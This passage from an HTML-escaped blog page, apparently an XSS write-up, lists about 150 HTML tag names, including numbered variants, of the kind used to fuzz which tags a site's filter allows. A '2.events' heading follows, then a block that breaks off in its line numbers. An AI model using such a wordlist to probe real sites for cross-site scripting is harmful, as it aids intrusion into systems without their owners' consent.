&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;abbr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;acronym&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;address&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;animate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;animatemotion&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;animatetransform&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;applet&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;area&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;article&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aside&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;audio&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;audio2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bdi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bdo&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;big&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;blink&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;blockquote&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;body&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;br&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;button&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;canvas&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;caption&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;center&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cite&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;col&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;colgroup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;command&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;content&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;custom tags&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;datalist&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;del&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;details&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dfn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dialog&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dir&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;div&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dl&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;element&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;em&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;embed&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fieldset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;figcaption&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;figure&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;font&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;footer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;form&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;frame&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;frameset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;h1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;head&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;header&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hgroup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;html&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iframe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iframe2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;image&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;image2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;image3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;img&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;img2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;input&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;input2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;input3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;input4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ins&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kbd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;keygen&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;label&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;legend&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;li&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;link&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;listing&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;map&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mark&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;marquee&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;menu&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;menuitem&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;meta&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;meter&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;multicol&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nav&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nextid&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nobr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;noembed&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;noframes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;noscript&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;object&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ol&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;optgroup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;option&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;output&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;param&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;picture&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;plaintext&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pre&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;progress&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;q&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rtc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ruby&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;samp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;script&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;section&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shadow&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;slot&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;small&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;source&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;spacer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;span&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;strike&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;strong&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;style&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sub&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;summary&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;svg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;table&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tbody&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;td&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;template&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;textarea&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tfoot&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;th&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;thead&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;title&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;track&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;u&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ul&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;video&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;video2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wbr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;xmp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;2.events&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span 